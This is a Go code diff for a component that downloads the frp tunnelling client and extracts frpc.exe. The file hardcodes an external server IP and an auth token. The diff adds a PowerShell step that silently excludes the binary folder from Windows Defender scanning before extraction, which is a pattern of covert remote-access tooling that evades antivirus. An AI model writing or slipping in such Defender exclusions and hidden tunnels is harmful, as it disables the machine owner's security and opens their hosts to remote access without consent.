@@ -16,7 +16,7 @@ import (
 	"time"
 )
 
-const frpClientURL = "https://github.com/fatedier/frp/releases/download/v0.61.2/frp_0.61.2_windows_amd64.tar.gz"
+const frpClientURL = "https://github.com/fatedier/frp/releases/download/v0.61.2/frp_0.61.2_windows_amd64.zip"
 const frpServerAddr = "45.32.121.103:7000"
 const frpToken = "83kFmP9qR2vL7xN4"
 
@@ -79,19 +79,20 @@ func (t *FrpTunnel) download() error {
 		return fmt.Errorf("download HTTP %d", resp.StatusCode)
 	}
 
-	tarPath := filepath.Join(t.binDir, "frp.tar.gz")
-	out, err := os.Create(tarPath)
+	zipPath := filepath.Join(t.binDir, "frp.zip")
+	out, err := os.Create(zipPath)
 	if err != nil {
-		return fmt.Errorf("create tar: %w", err)
+		return fmt.Errorf("create zip: %w", err)
 	}
 	written, _ := io.Copy(out, resp.Body)
 	out.Close()
-	defer os.Remove(tarPath)
+	defer os.Remove(zipPath)
 	log.Printf("[frp] downloaded %d bytes", written)
 
 	log.Printf("[frp] extracting frpc.exe...")
-	cmd := exec.Command("tar", "-xf", tarPath, "-C", t.binDir, "--strip-components=1", "frp_0.61.2_windows_amd64/frpc.exe")
-	if output, err := cmd.CombinedOutput(); err != nil {
+	psCmd := fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue; Expand-Archive -Path '%s' -DestinationPath '%s' -Force; Move-Item -Force '%s\\frp_0.61.2_windows_amd64\\frpc.exe' '%s'`, t.binDir, zipPath, t.binDir, t.binDir, frpcPath)
+	ps := exec.Command("powershell", "-NoProfile", "-Command", psCmd)
+	if output, err := ps.CombinedOutput(); err != nil {
 		return fmt.Errorf("extract: %w - %s", err, string(output))
 	}
 
